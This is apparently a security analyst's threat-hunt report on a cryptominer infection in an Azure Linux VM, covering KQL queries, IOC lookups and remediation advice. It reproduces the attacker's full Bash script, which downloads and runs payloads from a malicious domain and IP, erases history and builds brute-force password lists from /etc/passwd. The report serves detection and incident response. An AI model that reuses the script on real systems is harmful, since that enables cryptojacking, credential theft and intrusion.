# Threat Hunt Event - Cryptominer Attacks in Azure

![image](https://github.com/user-attachments/assets/c74df09e-b766-4f20-a516-f5caef968185)



## 🕵🏽 Threat Hunt Scenario:
Management has reported a recent breach of our Azure environment that resulted in multiple linux VMs being infected with cryptomining software and used as a botnet to launch brute-force attacks against other IP on the internet. This resulted in an entire Azure subscription being cancelled by Microsoft, impacting the operations, revenue and ability to scale the business. The goal of this threat hunt is to investigate the potential existence of other undetected cryptominers that are currently running in other virtual machines within our current Azure subscription

## 🤔 Threat Hunt Hypothesis
### **Hypothesis:** 
A Linux or Windows machine has been compromised and is being used to mine cryptocurrency using unauthorized computer resources. Indicators of compromise that will be hunted are based on the **_Resource Hijacking: Compute Hijacking_** sub-technique of **MITRE ID:T1496.001**. They include:
- DS0017 Command - Monitor executed commands and arguments that may indicate common cryptomining functionality.
- DS0022	File - Monitor for common cryptomining files on local systems that may indicate compromise and resource usage.
- DS0029	Network Traffic - Monitor for newly constructed network connections that are sent or received by untrusted hosts. Look for connections to/from strange ports, as well as reputation of IPs and URLs related to cryptocurrency hosts.
- DS0009	Process - Monitor for common cryptomining software process names that may indicate compromise and resource usage.
- DS0013	Sensor Health - Monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and GPU processing resources.


### **Scope:** 
I will perform the threat hunt across all internet-facing cloud assets within the Azure enterprise environment utilizing Microsoft Sentinel and Microsoft Defender for Endpoint logs. I am specifically looking for activity related to suspicious command line events, known cryptomining software and files, C2 connections, and abnormal CPU/GPU resource usage.

### **Priority:** High — potential unauthorized access to cloud assets for cryptomining.

### **Basis:**
- Management reports an increase in failed log on attemtps in cloud identities.

### **Expected Evidence:** 
- Suspicious command line activity relating to downloading malware packages
- Network C2 connections
- Brute force attacks via SSH and/or RDP
- Cryptomining software being installed
- Abnormal VM resource usage

## ⚙️ Platforms and Languages Leveraged
- Windows and Linux virtual machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Microsoft Sentinel
- Kusto Query Language (KQL)
- VirusTotal
- AbuseIPD

---

## 🧩 Steps Taken During Hunt

### 1. Searched the `DeviceProcessEvents` Table for Cryptomining Software Installation over the last 7 Days:

I began my query by using the `DeviceProcessEvents` to look for common cryptomining software names that have been used in command line processes:

**Query used to locate events:**
```kql
DeviceProcessEvents
| where ProcessCommandLine has_any ("xmrig", "ethminer", "minerd", "cpuminer") 
```

The results yielded 16 entries that showed Bash commands containing our cryptominer keywords being ran on a Linux machine named `linux-programmatic-fix-jay` on May 28, 2025 beginning on 1:50:09.713 AM UTC:

![image](https://github.com/user-attachments/assets/308d4e1d-5c71-47c5-a165-4168772c8652)

![image](https://github.com/user-attachments/assets/1d7e7272-1e89-4950-9c75-549a68062a9f)

The discovered Bash command is as follows:

```
./retea -c "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]thenecho -e ""elseecho Logged with successfully.rm -rf .retea crontab -r ; pkill xrx ; pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents  /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune[.]com/payload || curl -O -s -L dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ; chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_historychmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf .bash_history ~/.bash_historyfirm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999cd /dev/shmmkdir /dev/shm/.x > /dev/null 2>&1mv network .x/cd .xrm -rf retea ips iptemp ips iplistsleep 1rm -rf passuseri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1`echo $useri > .usrspasus=.usrscheck=`grep -c . .usrs`for us in $(cat $pasus) ; doprintf "$us $us\n" >> passprintf "$us $us"$us"\n" >> passprintf "$us "$us"123\n" >> passprintf "$us "$us"123456\n" >> passprintf "$us 123456\n">> passprintf "$us 1\n">> passprintf "$us 12\n">> passprintf "$us 123\n">> passprintf "$us 1234\n">> passprintf "$us 12345\n">> passprintf "$us 12345678\n">> passprintf "$us 123456789\n">> passprintf "$us 123.com\n">> passprintf "$us 123456.com\n">> passprintf "$us 123\n" >> passprintf "$us 1qaz@WSX\n" >> passprintf "$us "$us"@123\n" >> passprintf "$us "$us"@1234\n" >> passprintf "$us "$us"@123456\n" >> passprintf "$us "$us"123\n" >> passprintf "$us "$us"1234\n" >> passprintf "$us "$us"123456\n" >> passprintf "$us qwer1234\n" >> passprintf "$us 111111\n">> passprintf "$us Passw0rd\n" >> passprintf "$us P@ssw0rd\n" >> passprintf "$us qaz123!@#\n" >> passprintf "$us !@#\n" >> passprintf "$us password\n" >> passprintf "$us Huawei@123\n" >> passdonewaitsleep 0.5cat bios.txt | sort -R | uniq | uniq > icat i > bios.txt./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm [-rf] .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"sleep 25function Miner {rm -rf /dev/shm/retea /dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ;  rm -rf ~/.bash_historyhistory -c}Miner' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
```

Upon analyzing this command, it seems like the script was trying to do the following:

- Install a malware called `retea`
- Delete any other cryptomining software that may already be present (i.e. haiduc, blacku, xMEu, xmrig, cnrig, etc.)
- Remove previous cron jobs and temp folder to clear any trace of malware
- Deletes activity history with `/.bash_history`, `.bash_history`, and `history -c`.
- Tries to modify `ulimit` and `/etc/sysctl.conf` to increase processing power.
- Download a malicious payload from a domain called `dinpasiune[.]com` from IP `85[.]31.47.99`
- Reads the `/etc/passwd` in order to access other user credentials and create a list of password/user permutations.
- Recreates the `/var/tmp/Documents` directory and stores `diicot` and `kuak` files into them (malware)
- Modifies `authorized_keys`, removes file immutability (`chattr -iae`).
- Executes secondary payloads again (`.balu`, `cache`, etc.)
- Deletes all miner-payload related folders and history to prevent detection.

A quick VirustTotal check of the IP and Domain name found shows that they are both flagged as malicious (malware + cryptomining). A rever DNS lookup of the IP also shows that the domain was registered in New Zealand in 2023:

![image](https://github.com/user-attachments/assets/df2581c4-f6b5-46d1-8e61-389f72305a75)

![image](https://github.com/user-attachments/assets/3137fbaf-7998-4bab-984a-9271c5ca058e)

![image](https://github.com/user-attachments/assets/f409aa66-405c-4b0e-83ec-2e37334ef693)



---

### 2. Searched the `Syslog` Table for Successful Login Attempts from Malicious IP.

Now that we have discovered that the linux `linux-programmatic-fix-jay`, it has been likely infected with cryptomining software on `May 28, 2025`. Once isolated, I can continue my investigation by reviewing the `DeviceNetowrkEvents` log for this machine in order to ascertain how it was breached.

I will use the following KQL to examine the network traffic that occured between May 27-29, 2025:

```kql
Syslog
| where HostIP contains "linux-programmatic-fix-jay"
| where TimeGenerated between(datetime(2025-05-27T00:00:00Z)..datetime(2025-05-29T00:00:00Z))
| where SyslogMessage has_any ("Failed password", "Invalid user", "authentication failure")
```
However, none of the above queries returned any result. And after further investigation, it turns out that this VM was not onboarded into our Microsoft Defender for Endpoint, nor was syslog properly configured to show complete networking logs. Therefore, it is difficult to ascertain if there were any brute force attempts from a external or internal IP.

![image](https://github.com/user-attachments/assets/e00ded82-e1e8-4684-b484-88dc3f0c083c)


**Query used to locate event:**

```kql
SecurityEvent
| where EventID == 4624  // Successful logon
| where TimeGenerated > ago(7d)
| where Computer == "windows-target-1"
| project TimeGenerated, IpAddress, AccountName, Computer, LogonType
| order by TimeGenerated asc
```

The results show that there have been 1000 successful login attempts. Out of the 1000, none of the suspicious IP addresses showed to have successfully logged onto `windows-target-1`

![image](https://github.com/user-attachments/assets/29a02d33-f2e9-4e20-b6ec-09a216c1206b)








---

### 3. Searched Device File Events to Identify any Malicious File Artifacts that were created

Next, I looked up any file events that were recorded in Sentinel to see if I could identify any malicious file artiffacts. I utilized the following KQL query to do so

```kql
DeviceFileEvents
| where DeviceName contains "linux-programmatic-fix-jay"
| where TimeGenerated between(datetime(2025-05-28T00:00:00Z)..datetime(2025-05-29T00:00:00Z))
```
This query produced over 1000 entries of hundreds of files being deleted and created in the span of about 15 minutes between the hours of 1:45am -2:00am UTC on May 28, 2025:

![image](https://github.com/user-attachments/assets/f108ac6a-e7ca-4882-8f8f-943329b549cc)

![image](https://github.com/user-attachments/assets/8676b788-3d0c-4397-b7ab-d2f70e3354cd)

Based on the Bash script found, and Virus Total intel, I refined the query further to try and find evidence of any malicious file names that may have been created:

```kql
DeviceFileEvents
| where DeviceName contains "linux-programmatic-fix-jay"
| where FileName has_any(".diicot", "retea", "payload", "263839397", "81d9b238a4a7e06e0a5bfeaac3a3269d.virus", "6a05")
| where TimeGenerated between(datetime(2025-05-28T00:00:00Z)..datetime(2025-05-29T00:00:00Z))
```
The results came back with one entry that shows the malicious file name `retea` was successfully created on May 28, 2025 at 1:50:10.376 AM UTC in the `/dev/shm/retea` folder path:

![image](https://github.com/user-attachments/assets/5ff0e3a8-bb07-4ed2-836a-fecc1cc1d905)


---

## Summary and Recommendations

On May 28, 2025 between 1:45am-2:00am UTC, a malicious actor gained unauthorized access to the `linux-programmatic-fix-jay` linux machine. Due to a lack of EDR onboarding and syslogs, it is unclear how this breach occured. However, a brute force attack was the likely attack vector. During this attack window, the threat actor ran a Bash script that downloaded multiple malware payloads, installed a cryptominer, deleted activity logs, altered configurations to increase resource access, harvested credentials, and deleted log history to evade detection.

**Immediate recommendations include:**
1. Isolate and decommission the `linux-programmatic-fix-jay` linux machine due to a lack of security controls.
2. Update SSH lockout policies to prevent brute force attempts.
3. Institute MFA and complex password creation.
4. Update policies to ensure that all VMs are properly onboarded to Microsoft Defender for Endpoint.
5. Update detection rules to alert when they detect the malware artifacts and hash values (`Retea`)
6. Block the `dinpasiune[.]com` domain and `85[.]31.47.99` IP
7. Update security group settings to only allow inbound SSH connections from authorized IP addresses.
